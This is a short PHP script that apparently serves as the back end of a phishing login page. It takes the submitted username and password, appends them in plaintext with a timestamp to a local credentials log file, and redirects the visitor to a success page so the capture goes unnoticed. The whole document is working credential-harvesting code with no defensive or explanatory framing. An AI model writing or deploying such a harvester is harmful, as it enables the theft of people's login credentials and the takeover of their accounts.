<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$timestamp = date('Y-m-d H:i:s');
$log = "[$timestamp] Username: $username | Password: $password\n";
file_put_contents('credentials_log.txt', $log, FILE_APPEND | LOCK_EX);
header("Location: success.html");
exit();
?>